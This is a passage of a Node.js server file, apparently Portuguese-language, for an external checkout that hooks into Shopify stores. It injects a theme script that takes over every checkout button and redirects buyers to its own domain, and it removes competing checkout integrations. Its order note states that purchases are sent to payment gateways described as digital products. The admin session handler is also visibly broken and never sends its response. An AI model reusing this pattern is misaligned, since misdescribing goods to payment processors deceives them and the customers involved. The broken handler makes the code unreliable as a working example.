const shopifyThemeFileQuery = `
  query CheckoutThemeFile($themeId: ID!, $filenames: [String!]!) {
    theme(id: $themeId) {
      id
      name
      role
      files(filenames: $filenames, first: 1) {
        nodes {
          filename
          body {
            ... on OnlineStoreThemeFileBodyText {
              content
            }
          }
        }
      }
    }
  }
`;

const shopifyThemeFilesUpsertMutation = `
  mutation CheckoutThemeFilesUpsert($themeId: ID!, $files: [OnlineStoreThemeFilesUpsertFileInput!]!) {
    themeFilesUpsert(themeId: $themeId, files: $files) {
      job {
        id
      }
      upsertedThemeFiles {
        filename
      }
      userErrors {
        field
        message
      }
    }
  }
`;

function shopifyGid(type, value) {
  const raw = String(value || "").trim();
  if (!raw) return "";
  return raw.startsWith("gid://") ? raw : `gid://shopify/${type}/${raw}`;
}

function shopifyMoneyBag(value) {
  return {
    shopMoney: {
      amount: Math.round((Number(value || 0) + Number.EPSILON) * 100) / 100,
      currencyCode: "BRL"
    }
  };
}

function compactObject(object) {
  return Object.fromEntries(
    Object.entries(object).filter(([, value]) => {
      if (Array.isArray(value)) return value.length > 0;
      if (value && typeof value === "object") return Object.keys(value).length > 0;
      return value !== "" && value !== null && value !== undefined;
    })
  );
}

function e164Phone(value) {
  const phone = digitsOnly(value);
  if (!phone) return "";
  if (phone.startsWith("55")) return `+${phone}`;
  if (phone.length === 10 || phone.length === 11) return `+55${phone}`;
  return `+${phone}`;
}

function shopifyCustomer(order) {
  return {
    toUpsert: compactObject({
      email: order.customer?.email || "",
      firstName: order.customer?.firstName || "",
      lastName: order.customer?.lastName || "",
      tags: ["wpink-checkout"]
    })
  };
}

function shopifyMailingAddress(order, address = {}) {
  return compactObject({
    firstName: order.customer?.firstName || "",
    lastName: order.customer?.lastName || "",
    address1: [address.address, address.district].filter(Boolean).join(" - "),
    address2: [address.number, address.complement].filter(Boolean).join(" - "),
    city: address.city || "",
    provinceCode: address.state || "",
    countryCode: "BR",
    zip: address.cep || "",
    phone: e164Phone(order.customer?.phone)
  });
}

function orderCatalogProduct(db, order, orderItem = {}) {
  return db.products.find((product) => {
    if (product.id === orderItem.productId) return true;
    if (product.id === order.productId || product.id === order.panel?.productId) return true;
    if (orderItem.variantId && String(product.variantId || "") === String(orderItem.variantId)) return true;
    return false;
  }) || null;
}

function orderCheckoutItems(order) {
  if (Array.isArray(order.items) && order.items.length) return order.items;
  return [{
    productId: order.productId || order.panel?.productId || "",
    name: order.product?.title || order.product?.name || gatewayProductName,
    title: order.product?.title || order.product?.name || gatewayProductName,
    variantTitle: "",
    sku: "",
    price: Number(order.totals?.subtotal || 0) / Math.max(1, Number(order.quantity || order.product?.quantity || 1)),
    variantId: order.product?.variantId || "",
    quantity: Math.max(1, Number(order.quantity || order.product?.quantity || 1))
  }];
}

function shopifyLineItem(db, order, orderItem = {}) {
  const product = orderCatalogProduct(db, order, orderItem) || {};
  const quantity = Math.max(1, Number(orderItem.quantity || order.quantity || order.product?.quantity || 1));
  const variantId = orderItem.shopifyVariantGid || product.shopifyVariantGid || shopifyGid("ProductVariant", orderItem.variantId || product.variantId || order.product?.variantId);
  const unitPrice = Number(orderItem.price || product.price || (Number(order.totals?.subtotal || 0) / quantity));
  const lineItem = compactObject({
    quantity,
    title: product.name || orderItem.title || orderItem.name || order.product?.title || order.product?.name || gatewayProductName,
    sku: product.sku || orderItem.sku || "",
    variantTitle: product.variantTitle || orderItem.variantTitle || "",
    requiresShipping: true,
    taxable: false,
    priceSet: shopifyMoneyBag(unitPrice)
  });
  if (variantId) lineItem.variantId = variantId;
  return lineItem;
}

function shopifyDiscountCode(order) {
  const discount = Number(order.totals?.discount || 0);
  if (!discount) return null;
  return {
    itemFixedDiscountCode: {
      code: order.coupon || "DESCONTO",
      amountSet: shopifyMoneyBag(discount)
    }
  };
}

function shopifyShippingLine(order) {
  const shipping = Number(order.totals?.shipping || 0);
  const title = order.shipping?.option?.name || order.shipping?.selected || "Entrega";
  return {
    title,
    code: title,
    source: "wpink-checkout",
    priceSet: shopifyMoneyBag(shipping)
  };
}

function shopifyTransaction(order) {
  return {
    kind: "SALE",
    status: "SUCCESS",
    gateway: gatewayLabel(order.gateway?.provider),
    authorizationCode: order.gateway?.transactionId || order.id,
    processedAt: order.gateway?.lastWebhookAt || order.updatedAt || now(),
    amountSet: shopifyMoneyBag(order.totals?.total || 0),
    receiptJson: compactObject({
      externalOrderId: order.id,
      gateway: order.gateway?.provider || "manual",
      transactionId: order.gateway?.transactionId || "",
      reference: order.gateway?.reference || ""
    })
  };
}

function buildShopifyOrderInput(db, store, order) {
  const discountCode = shopifyDiscountCode(order);
  return compactObject({
    email: order.customer?.email || "",
    phone: e164Phone(order.customer?.phone),
    currency: "BRL",
    presentmentCurrency: "BRL",
    processedAt: order.updatedAt || order.createdAt || now(),
    financialStatus: "PAID",
    sourceIdentifier: order.id,
    sourceUrl: store.checkoutDomain ? `https://${store.checkoutDomain}` : "",
    tags: ["wpink-checkout", "checkout-externo", order.gateway?.provider || "manual"],
    note: `Pedido externo ${order.id}. Gateway: ${gatewayLabel(order.gateway?.provider)}. Produto enviado para gateway como produtos digitais.`,
    customer: shopifyCustomer(order),
    shippingAddress: shopifyMailingAddress(order, order.shipping || {}),
    billingAddress: shopifyMailingAddress(order, order.billing || order.shipping || {}),
    lineItems: orderCheckoutItems(order).map((item) => shopifyLineItem(db, order, item)),
    shippingLines: [shopifyShippingLine(order)],
    discountCode,
    transactions: [shopifyTransaction(order)],
    customAttributes: [
      { key: "external_checkout", value: "wpink" },
      { key: "external_order_id", value: order.id },
      { key: "gateway", value: gatewayLabel(order.gateway?.provider) },
      { key: "gateway_transaction_id", value: order.gateway?.transactionId || "" },
      { key: "cpf", value: order.customer?.cpf || "" },
      { key: "instagram", value: order.customer?.instagram || "" },
      { key: "shipping_method", value: order.shipping?.option?.name || order.shipping?.selected || "" }
    ].filter((attribute) => attribute.value)
  });
}

async function createShopifyOrder(db, store, order) {
  const data = await shopifyGraphql(store, shopifyOrderCreateMutation, {
    order: buildShopifyOrderInput(db, store, order),
    options: {
      inventoryBehaviour: "DECREMENT_OBEYING_POLICY",
      sendReceipt: false,
      sendFulfillmentReceipt: false
    }
  });
  const payload = data.orderCreate || {};
  if (payload.userErrors?.length) {
    throw new Error(payload.userErrors.map((error) => error.message).join(" "));
  }
  if (!payload.order?.id) throw new Error("Shopify não retornou o pedido criado.");
  const legacyId = String(payload.order.legacyResourceId || legacyIdFromGid(payload.order.id));
  return {
    id: payload.order.id,
    legacyResourceId: legacyId,
    name: payload.order.name || "",
    financialStatus: payload.order.displayFinancialStatus || "",
    adminUrl: legacyId ? `https://${normalizeShopifyDomain(store.shopifyDomain)}/admin/orders/${legacyId}` : "",
    total: payload.order.totalPriceSet?.shopMoney?.amount || "",
    currency: payload.order.totalPriceSet?.shopMoney?.currencyCode || "BRL"
  };
}

function legacyIdFromGid(value) {
  return String(value || "").split("/").pop() || "";
}

function checkoutBaseForTheme(store, req, checkoutBaseUrl = "") {
  const explicit = String(checkoutBaseUrl || "").trim();
  if (explicit) return explicit.replace(/\/$/, "");
  if (store.checkoutDomain) return `https://${cleanDomain(store.checkoutDomain)}`;
  const proto = String(req.headers["x-forwarded-proto"] || "").split(",")[0] || "http";
  const host = String(req.headers["x-forwarded-host"] || req.headers.host || `localhost:${port}`).split(",")[0];
  return `${proto}://${host}`;
}

function checkoutThemeScript(store, checkoutBaseUrl) {
  return `(() => {
  const checkoutBase = ${JSON.stringify(checkoutBaseUrl)};
  const storeSlug = ${JSON.stringify(store.slug || store.id)};
  const checkoutButtonSelector = [
    "[data-luna-direct-checkout]",
    "[data-wpink-external-checkout]",
    "a[href*='skipCart=1']",
    "button[name='checkout']",
    "input[name='checkout']",
    ".luna_elem_mainBtn",
    ".luna_check_mainBtn",
    ".btn-checkout",
    "[onclick*='lunaClick']",
    "[onclick*='fakeClick']",
    "a[href='/checkout']",
    "a[href='/cart/?skipCart=1']",
    "a[href='/cart?skipCart=1']"
  ].join(",");
  let listenersAttached = false;
  let observerAttached = false;

  function checkoutUrl(extra = {}) {
    const url = new URL("/index.html", checkoutBase);
    url.searchParams.set("store", storeSlug);
    Object.entries(extra).forEach(([key, value]) => {
      if (value !== undefined && value !== null && value !== "") url.searchParams.set(key, value);
    });
    return url.toString();
  }

  function firstCartItem(cart) {
    return Array.isArray(cart?.items) && cart.items.length ? cart.items[0] : null;
  }

  function fallbackCheckoutUrl(cart) {
    const item = firstCartItem(cart);
    return checkoutUrl({
      variant: item?.variant_id || "",
      qty: item?.quantity || 1
    });
  }

  async function fetchCart() {
    const response = await fetch("/cart.js", {
      headers: {
        Accept: "application/json",
        "X-Requested-With": "XMLHttpRequest"
      },
      credentials: "same-origin"
    });
    if (!response.ok) throw new Error("Nao foi possivel carregar o carrinho.");
    return response.json();
  }

  async function createCartSession(cart) {
    const response = await fetch(new URL("/api/cart-session", checkoutBase).toString(), {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        store: storeSlug,
        cart,
        shop: window.Shopify?.shop || window.location.hostname,
        origin: window.location.host,
        url: window.location.href
      })
    });
    if (!response.ok) throw new Error("Nao foi possivel iniciar o checkout.");
    return response.json();
  }

  function setLoading(button, isLoading) {
    if (!(button instanceof HTMLElement)) return;
    if (isLoading) {
      button.dataset.wpinkOriginalText = button.textContent || "";
      button.setAttribute("aria-disabled", "true");
      button.classList.add("is-wpink-loading");
      if ("disabled" in button) button.disabled = true;
      if (button.textContent) button.textContent = "Carregando...";
      return;
    }
    button.removeAttribute("aria-disabled");
    button.classList.remove("is-wpink-loading");
    if ("disabled" in button) button.disabled = false;
    if (button.dataset.wpinkOriginalText) button.textContent = button.dataset.wpinkOriginalText;
  }

  async function redirectToCheckout(event) {
    const button = event.target instanceof Element ? event.target.closest(checkoutButtonSelector) : null;
    if (!button || button.dataset.wpinkRedirecting === "true") return;
    event.preventDefault();
    event.stopPropagation();
    event.stopImmediatePropagation();
    button.dataset.wpinkRedirecting = "true";
    setLoading(button, true);
    try {
      const cart = await fetchCart();
      if (!cart || Number(cart.item_count || 0) < 1) {
        window.location.href = "/cart";
        return;
      }
      const session = await createCartSession(cart);
      window.location.href = session.checkoutUrl || fallbackCheckoutUrl(cart);
    } catch (error) {
      try {
        const cart = await fetchCart();
        window.location.href = fallbackCheckoutUrl(cart);
      } catch (fallbackError) {
        window.location.href = checkoutUrl();
      }
    }
  }

  function updateButtons() {
    document.querySelectorAll(checkoutButtonSelector).forEach((button) => {
      if (button.dataset.wpinkExternalCheckout === "true") return;
      button.dataset.wpinkExternalCheckout = "true";
      if (button instanceof HTMLAnchorElement) {
        button.href = checkoutUrl();
      }
    });
  }

  function init() {
    updateButtons();
    if (listenersAttached) return;
    listenersAttached = true;
    document.addEventListener("click", redirectToCheckout, true);
    document.addEventListener("submit", (event) => {
      const submitter = event.submitter;
      const form = event.target;
      if (submitter?.matches?.(checkoutButtonSelector) || form?.querySelector?.("[name='checkout']")) {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();
        redirectToCheckout({
          target: submitter || form.querySelector("[name='checkout']"),
          preventDefault() {},
          stopPropagation() {},
          stopImmediatePropagation() {}
        });
      }
    }, true);
    if (!observerAttached) {
      observerAttached = true;
      new MutationObserver(updateButtons).observe(document.documentElement, { childList: true, subtree: true });
    }
  }

  init();
  document.addEventListener("DOMContentLoaded", init);
})();`;
}

function injectCheckoutScript(themeLiquid) {
  const marker = "<!-- wpink-external-checkout -->";
  const scriptTag = `${marker}\n<script src="{{ 'wpink-external-checkout.js' | asset_url }}" defer></script>`;
  let output = themeLiquid.replace(/\s*<!-- Não remova\. Checkout PayCentral\. -->[\s\S]*?<!-- Não remova\. Checkout PayCentral\. -->/g, "");
  output = output.replace(/\s*<!-- Nao remova\. Checkout PayCentral\. -->[\s\S]*?<!-- Nao remova\. Checkout PayCentral\. -->/g, "");
  output = output.replace(/\s*<link[^>]+shopify\.integration\.lunacheckout\.com[^>]*>\s*/g, "\n");
  if (output.includes("wpink-external-checkout.js")) return output;
  if (output.includes("</body>")) return output.replace("</body>", `${scriptTag}\n</body>`);
  return `${output}\n${scriptTag}\n`;
}

function patchLegacyLunaThemeJs(themeJs, checkoutBaseUrl) {
  if (!themeJs) return themeJs;
  const lunaEndpoint = "https://shopify.integration.lunacheckout.com/cart";
  return themeJs.replaceAll(lunaEndpoint, new URL("/api/luna-cart", checkoutBaseUrl).toString());
}

async function fetchMainTheme(store) {
  const data = await shopifyGraphql(store, shopifyMainThemeQuery);
  const theme = data.themes?.nodes?.[0];
  if (!theme?.id) throw new Error("Tema principal da Shopify não encontrado.");
  return theme;
}

async function fetchThemeFile(store, themeId, filename) {
  const data = await shopifyGraphql(store, shopifyThemeFileQuery, { themeId, filenames: [filename] });
  return data.theme?.files?.nodes?.[0]?.body?.content || "";
}

async function upsertThemeFiles(store, themeId, files) {
  const data = await shopifyGraphql(store, shopifyThemeFilesUpsertMutation, { themeId, files });
  const payload = data.themeFilesUpsert || {};
  if (payload.userErrors?.length) {
    throw new Error(payload.userErrors.map((error) => error.message).join(" "));
  }
  return {
    jobId: payload.job?.id || "",
    files: (payload.upsertedThemeFiles || []).map((file) => file.filename)
  };
}

async function installCheckoutThemeScript(store, req, checkoutBaseUrl = "") {
  const baseUrl = checkoutBaseForTheme(store, req, checkoutBaseUrl);
  const theme = await fetchMainTheme(store);
  const themeLiquid = await fetchThemeFile(store, theme.id, "layout/theme.liquid");
  if (!themeLiquid) throw new Error("Não consegui ler layout/theme.liquid do tema.");
  const themeJs = await fetchThemeFile(store, theme.id, "assets/theme.js").catch(() => "");
  const updatedThemeLiquid = injectCheckoutScript(themeLiquid);
  const updatedThemeJs = patchLegacyLunaThemeJs(themeJs, baseUrl);
  const files = [
    {
      filename: "assets/wpink-external-checkout.js",
      body: { type: "TEXT", value: checkoutThemeScript(store, baseUrl) }
    }
  ];
  if (updatedThemeLiquid !== themeLiquid) {
    files.push({
      filename: "layout/theme.liquid",
      body: { type: "TEXT", value: updatedThemeLiquid }
    });
  }
  if (updatedThemeJs && updatedThemeJs !== themeJs) {
    files.push({
      filename: "assets/theme.js",
      body: { type: "TEXT", value: updatedThemeJs }
    });
  }
  const result = await upsertThemeFiles(store, theme.id, files);
  store.themeIntegration = {
    status: "installed",
    themeId: theme.id,
    themeName: theme.name,
    checkoutBaseUrl: baseUrl,
    files: result.files,
    jobId: result.jobId,
    installedAt: now()
  };
  store.updatedAt = now();
  return store.themeIntegration;
}

async function ensureShopifyOrderForPaidOrder(db, store, order) {
  if (!order || order.status !== "paid") return null;
  if (order.shopifyOrder?.id) return order.shopifyOrder;
  try {
    const shopifyOrder = await createShopifyOrder(db, store, order);
    order.shopifyOrder = {
      ...shopifyOrder,
      createdAt: now()
    };
    order.shopifySync = {
      status: "created",
      message: "Pedido criado na Shopify.",
      updatedAt: now()
    };
    return order.shopifyOrder;
  } catch (error) {
    order.shopifySync = {
      status: "error",
      message: error.message || "Erro ao criar pedido na Shopify.",
      updatedAt: now()
    };
    return null;
  }
}

async function fetchShopifyScopes(store) {
  const data = await shopifyGraphql(store, shopifyScopesQuery);
  return (data.appInstallation?.accessScopes || []).map((scope) => scope.handle).sort();
}

async function fetchShopifyProducts(store) {
  const products = [];
  let cursor = null;
  let page = 0;
  do {
    const data = await shopifyGraphql(store, shopifyProductsQuery, { cursor });
    const connection = data.products;
    products.push(...(connection?.nodes || []));
    cursor = connection?.pageInfo?.hasNextPage ? connection.pageInfo.endCursor : null;
    page += 1;
  } while (cursor && page < 20);
  return products;
}

function imageFromShopify(product, variant) {
  return variant?.media?.nodes?.[0]?.preview?.image?.url || product?.featuredMedia?.preview?.image?.url || "./assets/product.png";
}

function shopifyProductsToCheckoutProducts(store, shopifyProducts, timestamp) {
  return shopifyProducts.flatMap((shopifyProduct) => {
    const variants = shopifyProduct.variants?.nodes || [];
    return variants.map((variant) => {
      const variantLegacyId = String(variant.legacyResourceId || legacyId(variant.id));
      const variantTitle = variant.title && variant.title !== "Default Title" ? variant.title : "";
      const name = variantTitle ? `${shopifyProduct.title} - ${variantTitle}` : shopifyProduct.title;
      const slug = slugify([shopifyProduct.handle || shopifyProduct.title, variantTitle].filter(Boolean).join("-"));
      return {
        id: `shopify_${store.id}_${variantLegacyId}`,
        storeId: store.id,
        name,
        slug,
        price: numberValue(variant.price),
        compareAt: numberValue(variant.compareAtPrice),
        image: imageFromShopify(shopifyProduct, variant),
        variantId: variantLegacyId,
        shopifyProductId: String(shopifyProduct.legacyResourceId || legacyId(shopifyProduct.id)),
        shopifyProductGid: shopifyProduct.id,
        shopifyVariantGid: variant.id,
        variantTitle,
        sku: variant.sku || "",
        source: "shopify",
        active: shopifyProduct.status === "ACTIVE" && variant.availableForSale !== false,
        syncedAt: timestamp,
        createdAt: timestamp,
        updatedAt: timestamp
      };
    });
  });
}

function upsertProducts(db, store, incomingProducts, source, deactivateMissing = false) {
  const timestamp = now();
  let created = 0;
  let updated = 0;
  let inactive = 0;
  const incomingIds = new Set();

  incomingProducts.forEach((product) => {
    incomingIds.add(product.id);
    const existing = db.products.find((item) => {
      if (item.id === product.id) return true;
      if (product.shopifyVariantGid && item.shopifyVariantGid === product.shopifyVariantGid) return true;
      return false;
    });
    if (existing) {
      Object.assign(existing, {
        ...product,
        id: existing.id,
        createdAt: existing.createdAt || product.createdAt || timestamp,
        updatedAt: timestamp
      });
      updated += 1;
    } else {
      db.products.push({ ...product, createdAt: product.createdAt || timestamp, updatedAt: timestamp });
      created += 1;
    }
  });

  if (deactivateMissing) {
    db.products.forEach((product) => {
      if (product.storeId === store.id && product.source === source && !incomingIds.has(product.id) && product.active !== false) {
        product.active = false;
        product.updatedAt = timestamp;
        inactive += 1;
      }
    });
  }

  return { created, updated, inactive };
}

async function syncShopifyProducts(db, store) {
  const timestamp = now();
  const shopifyProducts = await fetchShopifyProducts(store);
  const checkoutProducts = shopifyProductsToCheckoutProducts(store, shopifyProducts, timestamp);
  const result = upsertProducts(db, store, checkoutProducts, "shopify", true);
  store.lastShopifySyncAt = timestamp;
  store.updatedAt = timestamp;
  return {
    ...result,
    imported: checkoutProducts.length,
    products: checkoutProducts
  };
}

function parseCsv(csv) {
  const rows = [];
  let row = [];
  let field = "";
  let quoted = false;
  const input = String(csv || "").replace(/^\uFEFF/, "");

  for (let index = 0; index < input.length; index += 1) {
    const char = input[index];
    const next = input[index + 1];
    if (char === '"') {
      if (quoted && next === '"') {
        field += '"';
        index += 1;
      } else {
        quoted = !quoted;
      }
    } else if (char === "," && !quoted) {
      row.push(field);
      field = "";
    } else if ((char === "\n" || char === "\r") && !quoted) {
      if (char === "\r" && next === "\n") index += 1;
      row.push(field);
      if (row.some((item) => String(item).trim())) rows.push(row);
      row = [];
      field = "";
    } else {
      field += char;
    }
  }

  row.push(field);
  if (row.some((item) => String(item).trim())) rows.push(row);
  if (!rows.length) return [];

  const headers = rows.shift().map((header) => String(header || "").trim().toLowerCase());
  return rows.map((items) => {
    const object = {};
    headers.forEach((header, index) => {
      object[header] = items[index] || "";
    });
    return object;
  });
}

function rowValue(row, names) {
  for (const name of names) {
    const value = row[String(name).toLowerCase()];
    if (String(value || "").trim()) return String(value).trim();
  }
  return "";
}

function csvProductsToCheckoutProducts(store, csv, timestamp) {
  const rows = parseCsv(csv);
  const infoByHandle = new Map();

  rows.forEach((row) => {
    const handle = rowValue(row, ["Handle", "Slug"]) || slugify(rowValue(row, ["Title", "Nome"]));
    if (!handle) return;
    const info = infoByHandle.get(handle) || { title: "", image: "", status: "" };
    info.title ||= rowValue(row, ["Title", "Nome"]);
    info.image ||= rowValue(row, ["Variant Image", "Image Src", "Imagem"]);
    info.status ||= rowValue(row, ["Status", "Published"]);
    infoByHandle.set(handle, info);
  });

  const usedIds = new Map();
  return rows.flatMap((row, index) => {
    const handle = rowValue(row, ["Handle", "Slug"]) || slugify(rowValue(row, ["Title", "Nome"]));
    if (!handle) return [];
    const info = infoByHandle.get(handle) || {};
    const price = rowValue(row, ["Variant Price", "Price", "Preco", "Preço"]);
    const sku = rowValue(row, ["Variant SKU", "SKU"]);
    const barcode = rowValue(row, ["Variant Barcode", "Barcode"]);
    const optionValues = [
      rowValue(row, ["Option1 Value", "Opcao1 Valor", "Opção1 Valor"]),
      rowValue(row, ["Option2 Value", "Opcao2 Valor", "Opção2 Valor"]),
      rowValue(row, ["Option3 Value", "Opcao3 Valor", "Opção3 Valor"])
    ].filter((value) => value && value !== "Default Title");
    if (!price && !sku && !barcode && !optionValues.length && !rowValue(row, ["Title", "Nome"])) return [];

    const variantId = rowValue(row, ["Variant ID", "Variant Id", "ID da Variante", "Variant Legacy ID"]);
    const idBase = variantId || sku || barcode || [handle, ...optionValues].filter(Boolean).join("-");
    const localIdBase = `csv_${store.id}_${slugify(idBase || `${handle}-${index}`)}`;
    const count = usedIds.get(localIdBase) || 0;
    usedIds.set(localIdBase, count + 1);
    const localId = count ? `${localIdBase}_${count + 1}` : localIdBase;
    const title = rowValue(row, ["Title", "Nome"]) || info.title || handle;
    const variantTitle = optionValues.join(" / ");
    const name = variantTitle ? `${title} - ${variantTitle}` : title;
    const status = String(rowValue(row, ["Status"]) || info.status || "active").toLowerCase();

    return [{
      id: localId,
      storeId: store.id,
      name,
      slug: slugify([handle, ...optionValues].filter(Boolean).join("-")),
      price: numberValue(price),
      compareAt: numberValue(rowValue(row, ["Variant Compare At Price", "Compare At Price", "Preco antigo", "Preço antigo"])),
      image: rowValue(row, ["Variant Image", "Image Src", "Imagem"]) || info.image || "./assets/product.png",
      variantId,
      variantTitle,
      sku,
      barcode,
      csvHandle: handle,
      source: "csv",
      active: !["archived", "false", "no", "nao", "não"].includes(status),
      syncedAt: timestamp,
      createdAt: timestamp,
      updatedAt: timestamp
    }];
  });
}

async function handleApi(req, res, url) {
  const db = readDb();
  const pathname = url.pathname;

  if (req.method === "GET" && pathname === "/api/admin/session") {
    const session = adminSessionFromRequest(req);
    return (res, 200, { authenticated: Boolean(session), user: session?.user || "" });
  }

  if (req.method === "POST" && pathname === "/api/admin/login") {
    const body = await readBody(req);
    const user = String(body.user || "").trim();
    const password = String(body.password || "");
    if (user !== adminUser || password !== adminPassword) {
      return sendError(res, 401, "Usuário ou senha inválidos.");
    }
    const token = crypto.randomBytes(24).toString("hex");
    adminSessions.set(token, {
      user,
      createdAt: Date.now(),
      expiresAt: Date.now() + 1000 * 60 * 60 * 12
    });
    setAdminSessionCookie(res, token);
    return sendJson(res, 200, { authenticated: true, user });
  }

  if (req.method === "POST" && pathname === "/api/admin/logout") {
    const token = parseCookies(req.headers.cookie)[sessionCookieName];
    if (token) adminSessions.delete(token);
    clearAdminSessionCookie(res);
    return sendJson(res, 200, { authenticated: false });
  }

  if (!requireAdmin(req, res, pathname)) return;

  if (req.method === "POST" && pathname === "/api/admin/clear-orders") {
    const removed = Array.isArray(db.orders) ? db.orders.length : 0;
    const removedCartSessions = Array.isArray(db.cartSessions) ? db.cartSessions.length : 0;
    db.orders = [];
    db.cartSessions = [];
    writeDb(db);
    return sendJson(res, 200, { removed, removedCartSessions, orders: 0 });
  }

  if (req.method === "POST" && pathname === "/api/cart-session") {
    const body = await readBody(req);
    const query = new URLSearchParams();
    if (body.store) query.set("store", body.store);
    const store = findStore(db, query, body.origin || req.headers.host || "");
    if (!store) return sendError(res, 404, "Loja não encontrada.");
    const session = createCartSession(db, store, body.cart || {}, {
      shop: body.shop,
      origin: body.origin,
      url: body.url
    });
    if (!session.items.length) return sendError(res, 400, "Carrinho vazio.");
    writeDb(db);
    const checkoutUrl = new URL("/index.html", checkoutBaseForTheme(store, req));
    checkoutUrl.searchParams.set("store", store.slug || store.id);
    checkoutUrl.searchParams.set("cartSession", session.id);
    return sendJson(res, 201, {
      id: session.id,
      checkoutUrl: checkoutUrl.toString()
    });
  }

  if (req.method === "POST" && pathname === "/api/luna-cart") {
    const body = await readBody(req);
    const store = findStore(db, new URLSearchParams(), body.origin || body.shop || req.headers.host || "");
    if (!store) return sendError(res, 404, "Loja não encontrada.");
    const session = createCartSession(db, store, body.cart_payload || body.cart || {}, {
      shop: body.shop,
      origin: body.origin,
      url: body.url
    });
    if (!session.items.length) return sendJson(res, 200, { active: true, checkout_direct_url: checkoutBaseForTheme(store, req) });
    writeDb(db);
    const checkoutUrl = new URL("/index.html", checkoutBaseForTheme(store, req));
    checkoutUrl.searchParams.set("store", store.slug || store.id);
    checkoutUrl.searchParams.set("cartSession", session.id);
    return sendJson(res, 200, {
      active: true,
      skip_purchase: false,
      checkout_direct_url: checkoutUrl.toString()
    });
  }

  const cartSessionMatch = pathname.match(/^\/api\/cart-session\/([^/]+)$/);
  if (req.method === "GET" && cartSessionMatch) {
    const session = publicCartSession(db, cartSessionMatch[1]);
    if (!session) return sendError(res, 404, "Sessão do carrinho não encontrada.");
    writeDb(db);
    return sendJson(res, 200, session);
  }

  if (req.method === "GET" && pathname === "/api/summary") {
    return sendJson(res, 200, summary(db));
  }

  if (req.method === "GET" && pathname === "/api/stores") {
    return sendJson(res, 200, db.stores.map(adminStore));
  }

  if (req.method === "POST" && pathname === "/api/stores") {
    const body = await readBody(req);
    const timestamp = now();
    const storeId = body.id || id("store");
    const slug = slugify(body.slug || body.name || storeId);
    const existing = db.stores.find((store) => store.id === storeId);
    const store = {
      id: storeId,
      name: body.name || "Nova loja",
      slug,
      shopifyDomain: normalizeShopifyDomain(body.shopifyDomain),
      shopifyAccessToken: process.env.SHOPIFY_ACCESS_TOKEN || "",
      shopifyClientId: String(body.shopifyClientId || existing?.shopifyClientId || "").trim(),
      shopifyClientSecret: process.env.SHOPIFY_CLIENT_SECRET || "",
      shopifyAccessTokenExpiresAt: existing?.shopifyAccessTokenExpiresAt || "",
      shopifyScopes: existing?.shopifyScopes || [],
      checkoutDomain: cleanDomain(body.checkoutDomain),
      dnsTarget: body.dnsTarget || publicCheckoutTarget,
      redirectMode: body.redirectMode || "checkout",
      status: body.status || "draft",
      activeGateway: ["manual", "blackcat", "paradise"].includes(body.activeGateway) ? body.activeGateway : existing?.activeGateway || "manual",
      blackcatApiKey: process.env.BLACKCAT_API_KEY || "",
      paradiseApiKey: process.env.PARADISE_API_KEY || "",
      shippingOptions: normalizeShippingOptions(body.shippingOptions || existing?.shippingOptions),
      createdAt: existing?.createdAt || timestamp,
      updatedAt: timestamp
    };
    if (existing) Object.assign(existing, store);
    else db.stores.push(store);
    writeDb(db);
    return sendJson(res, 200, adminStore(store));
  }

  if (req.method === "POST" && pathname === "/api/shopify/products/sync") {
    const body = await readBody(req);
    const store = db.stores.find((item) => item.id === body.storeId);
    if (!store) return sendError(res, 404, "Loja não encontrada.");
    const result = await syncShopifyProducts(db, store);
    writeDb(db);
    return sendJson(res, 200, result);
  }

  if (req.method === "POST" && pathname === "/api/shopify/scopes/check") {
    const body = await readBody(req);
    const store = db.stores.find((item) => item.id === body.storeId);
    if (!store) return sendError(res, 404, "Loja não encontrada.");
    const scopes = await fetchShopifyScopes(store);
    store.shopifyScopes = scopes;
    store.lastShopifyScopeCheckAt = now();
    store.updatedAt = now();
    writeDb(db);
    return sendJson(res, 200, { scopes });
  }

  if (req.method === "POST" && pathname === "/api/shopify/theme/install") {
    const body = await readBody(req);
    const store = db.stores.find((item) => item.id === body.storeId);
    if (!store) return sendError(res, 404, "Loja não encontrada.");
    try {
      const integration = await installCheckoutThemeScript(store, req, body.checkoutBaseUrl);
      writeDb(db);
      return sendJson(res, 200, integration);
    } catch (error) {
      store.themeIntegration = {
        status: "error",
        message: error.message || "Erro ao instalar no tema.",
        updatedAt: now()
      };
      store.updatedAt = now();
      writeDb(db);
      throw error;
    }
  }

  if (req.method === "POST" && pathname === "/api/gateway/check") {
    const body = await readBody(req);
    const store = db.stores.find((item) => item.id === body.storeId);
    if (!store) return sendError(res, 404, "Loja não encontrada.");
    const activeGateway = store.activeGateway || "manual";
    const configured = activeGateway === "blackcat"
      ? Boolean(store.blackcatApiKey)
      : activeGateway === "paradise"
        ? Boolean(store.paradiseApiKey)
        : true;
    let seller = null;
    if (configured && activeGateway === "blackcat") {
      const json = await gatewayGetJson(`${blackcatApiBaseUrl.replace(/\/$/, "")}/sales/seller`, store.blackcatApiKey);
      seller = json.data ? { name: json.data.name || "", legalName: json.data.legalName || "" } : null;
    }
    if (configured && activeGateway === "paradise") {
      const json = await gatewayGetJson(`${paradiseApiBaseUrl.replace(/\/$/, "")}/api/v1/seller.php`, store.paradiseApiKey);
      seller = { name: json.name || json.company_name || "", legalName: json.company_name || "" };
    }
    return sendJson(res, 200, {
      activeGateway,
      configured,
      hasBlackcatApiKey: Boolean(store.blackcatApiKey),
      hasParadiseApiKey: Boolean(store.paradiseApiKey),
      seller,
      blackcatWebhookUrl: "/api/webhooks/blackcat",
      paradiseWebhookUrl: "/api/webhooks/paradise"
    });
  }

  if (req.method === "POST" && pathname === "/api/payments/create") {
    const body = await readBody(req);
    const store = db.stores.find((item) => item.id === (body.storeId || body.panel?.storeId)) || db.stores[0];
    if (!store) return sendError(res, 404, "Loja não encontrada.");

    const order = prepareOrder({ ...body, storeId: store.id });
    const payment = await createGatewayPayment(store, order, req);
    order.status = payment.orderStatus || "pending";
    order.gateway = {
      provider: payment.provider,
      label: gatewayLabel(payment.provider),
      status: payment.status,
      rawStatus: payment.rawStatus || payment.status,
      transactionId: payment.transactionId || "",
      reference: payment.reference || order.id,
      invoiceUrl: payment.invoiceUrl || "",
      expiresAt: payment.expiresAt || "",
      createdAt: now(),
      rawResponse: payment.raw || null
    };

    const storedOrder = sanitizeOrderForStorage(order);
    await ensureShopifyOrderForPaidOrder(db, store, storedOrder);
    db.orders.push(storedOrder);
    writeDb(db);
